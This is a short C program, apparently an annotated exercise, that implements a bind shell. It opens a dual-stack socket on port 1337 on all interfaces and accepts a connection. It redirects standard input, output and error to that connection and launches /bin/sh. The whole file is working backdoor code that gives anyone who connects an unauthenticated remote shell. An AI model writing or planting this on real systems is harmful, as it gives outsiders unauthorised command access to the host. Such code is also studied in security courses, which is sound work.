#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <unistd.h>

int sockfd;
int recvConn;

static const int NO=0;

int main() {
  // int socket(int domain, int type, int protocol);
  // AF_INET6 sets up the socket for IPv6 usage
  // SOCK_STREAM ensures it's a bi-directional communication
  // 0 says we're using the Internet Protocol (IP)
  sockfd = socket(AF_INET6, SOCK_STREAM, 0);

  // int setsockopt(int sockfd, int level, int optname,
  //                const void *optval, socklen_t optlen);
  setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &NO, sizeof(NO));

  struct sockaddr_in v4lhost;
  struct sockaddr_in6 v6lhost;
  v6lhost.sin6_family = AF_INET6;
  v4lhost.sin_family = AF_INET;
  // uint16_t htons(uint16_t hostshort);
  v6lhost.sin6_port = htons(1337);
  v4lhost.sin_port = htons(1337);
  v6lhost.sin6_addr = in6addr_any;
  v4lhost.sin_addr.s_addr = INADDR_ANY;

  // int bind(int sockfd, const struct sockaddr *addr,
  //          socklen_t addrlen);
  bind(sockfd, (struct sockaddr*) &v4lhost, sizeof(v4lhost));
  bind(sockfd, (struct sockaddr*) &v6lhost, sizeof(v6lhost));

  // int listen(int sockfd, int backlog)
  listen(sockfd, 0);

  // int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  recvConn = accept(sockfd, NULL, NULL);

  // int dup2(int oldfd, int newfd);
  dup2(recvConn, 0);
  dup2(recvConn, 1);
  dup2(recvConn, 2);

  // int execve(const char *filename, char *const argv[],
  //            char *const envp[]);
  execve("/bin/sh", NULL, NULL);
  close(recvConn);

  return 0;
}
